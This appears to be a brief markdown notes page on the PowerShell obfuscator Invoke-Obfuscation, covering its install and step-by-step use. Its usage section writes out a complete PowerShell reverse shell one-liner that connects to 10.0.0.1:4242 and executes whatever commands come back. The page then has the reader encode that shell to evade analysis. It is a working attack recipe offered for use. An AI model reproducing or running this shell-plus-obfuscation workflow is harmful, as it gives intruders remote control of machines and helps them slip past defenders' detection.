# Obfuscation
Obfuscation re-organizes code to make it harder to analyze 

**Invoke-Obfuscation**  
Opensource powershell v2 script obfuscator  
https://github.com/danielbohannon/Invoke-Obfuscation  

```git clone https://github.com/danielbohannon/Invoke-Obfuscation```  

Install powershell -- ```sudo apt-get install powershell -y```  
```pwsh``` -- this launches a powershell session  
Navigate to the Invoke-Obfuscation folder that was cloned  
Importing module -- ```Import-Module ./Invoke-Obfuscation.psd1```  
Launching tool -- ```./Invoke-Obfuscation```  

**Usage**  
Copy code from Paylod all the things  
```powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"```  
Save it in a file called shell.ps1
Back to Invoke-Obfuscation  
```SET SCRIPTPATH Pathto/shell.ps1```  
```ENCODING```  
enter encoding option  
copy and save in new powershell script  
```SET SCRIPTPATH pathto/shell.ps1```

AST  
Select ALL  
1 to execute  

RESET -- clears everything
